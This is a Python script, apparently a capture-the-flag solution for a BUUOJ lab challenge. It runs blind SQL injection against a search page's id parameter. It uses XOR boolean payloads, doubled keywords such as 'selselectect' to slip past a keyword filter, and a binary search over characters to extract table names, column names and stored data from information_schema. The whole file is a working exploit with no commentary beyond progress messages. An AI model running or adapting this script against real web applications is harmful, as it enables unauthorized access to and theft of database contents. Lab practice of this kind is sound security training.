#!/usr/bin/env python3
import requests
import time
import string

URL = "http://68321904-15be-4b49-9f6a-508fbe5d863a.node5.buuoj.cn:81/search.php"
DELAY = 0.3

def test_condition(condition):
    """Test if condition is true using XOR blind injection"""
    payload = f"1^({condition})"
    try:
        r = requests.get(URL, params={"id": payload}, timeout=10)
        time.sleep(DELAY)
        return "ERROR" in r.text
    except Exception as e:
        print(f"[ERROR] {e}")
        time.sleep(5)
        return None

def extract_string(query, max_len=100):
    """Extract string using binary search"""
    result = ""

    # First find length
    length = None
    for l in range(1, max_len + 1):
        if test_condition(f"length({query})={l}"):
            length = l
            print(f"[+] Length: {length}")
            break

    if not length:
        print(f"[-] Could not determine length")
        return ""

    # Extract each character using binary search
    for pos in range(1, length + 1):
        low = 32
        high = 127

        while low < high:
            mid = (low + high) // 2
            if test_condition(f"ascii(substr({query},{pos},1))>{mid}"):
                low = mid + 1
            else:
                high = mid

        char = chr(low)
        result += char
        print(f"[+] Extracted: {result}")

    return result

# Try to extract table name from information_schema using regexp
print("[*] Trying to extract first table name...")

# Test if we can get any result
test = test_condition("substr((selselectect(table_name)frfrofromom(information_schema.tables)whwhereere(table_schema=database())limimitit(0,1)),1,1)regexp'^'")
print(f"[*] Test result: {test}")

# Let's try using a different approach - using count
count_test = test_condition("(selselectect(count(*))frfrofromom(information_schema.tables)whwhereere(table_schema=database()))>0")
print(f"[*] Count test: {count_test}")

# Extract count
if count_test:
    for c in range(1, 20):
        if test_condition(f"(selselectect(count(*))frfrofromom(information_schema.tables)whwhereere(table_schema=database()))={c}"):
            print(f"[+] Table count: {c}")
            break

# Try to extract first table name character by character
print("[*] Extracting first table name...")
table_query = "(selselectect(table_name)frfrofromom(information_schema.tables)whwhereere(table_schema=database())limimitit(0,1))"
table_name = extract_string(table_query, max_len=50)
print(f"[+] First table: {table_name}")

if table_name:
    # Extract columns
    print(f"\n[*] Extracting columns from {table_name}...")
    col_query = f"(selselectect(column_name)frfrofromom(information_schema.columns)whwhereere(table_name='{table_name}')limimitit(0,1))"
    col_name = extract_string(col_query, max_len=50)
    print(f"[+] First column: {col_name}")

    if col_name:
        # Extract data
        print(f"\n[*] Extracting data from {table_name}.{col_name}...")
        data_query = f"(selselectect({col_name})frfrofromom({table_name})limimitit(0,1))"
        data = extract_string(data_query, max_len=100)
        print(f"[+] Data: {data}")